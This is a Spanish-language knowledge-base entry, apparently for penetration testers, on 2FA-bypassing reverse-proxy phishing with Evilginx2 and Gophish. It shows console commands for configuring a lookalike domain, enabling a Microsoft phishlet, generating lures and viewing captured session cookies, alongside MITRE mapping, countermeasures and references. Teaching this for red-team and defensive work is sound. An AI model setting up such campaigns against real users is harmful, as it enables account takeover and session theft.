# Phishing Técnico (Evilginx2 & Gophish)

## Descripción
Uso de herramientas avanzadas para realizar campañas de phishing que superan el segundo factor de autenticación (2FA) mediante el uso de proxies inversos (Adversary-in-the-Middle). Evilginx2 captura cookies de sesión en tiempo real, permitiendo el acceso directo sin necesidad de conocer la contraseña.

## Clasificación
- **Fase**: Explotación
- **MITRE ATT&CK**: T1566 (Phishing)
- **Plataforma**: Multi
- **Dificultad**: Avanzada

## Herramientas
- **Evilginx2** (`phishlets`, `lures`) — proxy inverso capaz de capturar credenciales y tokens 2FA.
- **Gophish** — plataforma de gestión de campañas de phishing para seguimiento de clics y envíos masivos.
- **Let's Encrypt** — para obtener certificados SSL/TLS legítimos para los dominios de phishing.

## Comandos / Ejemplos

### Configuración básica de Evilginx2
```bash
# Configurar el dominio y la IP del servidor
config domain phish.com
config ip <server-ip>

# Habilitar un phishlet (ej: microsoft o google)
phishlets hostname microsoft login.phish.com
phishlets enable microsoft
```

### Gestión de Lures (Anzuelos)
```bash
# Crear un enlace de phishing personalizado
lures create microsoft
lures get 0
# Resultado: genera una URL única para enviar a la víctima
```

### Visualización de Sesiones Capturadas
```bash
# Listar las sesiones donde se han capturado cookies exitosamente
sessions
# Ver detalles de una sesión específica (incluye cookies JSON)
sessions <id>
```

## Contramedidas
- Implementar llaves de seguridad físicas (FIDO2/U2F) que son resistentes al phishing de proxy inverso.
- Utilizar soluciones de filtrado de correo electrónico basadas en IA para detectar anomalías en URLs.
- Fomentar la educación continua de los usuarios sobre la verificación de dominios en la barra de direcciones.
- Monitorear el registro de dominios similares (Typosquatting) relacionados con la organización.

## Referencias
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- MITRE Corporation. (2024). ATT&CK Technique T1566: Phishing. https://attack.mitre.org/techniques/T1566/
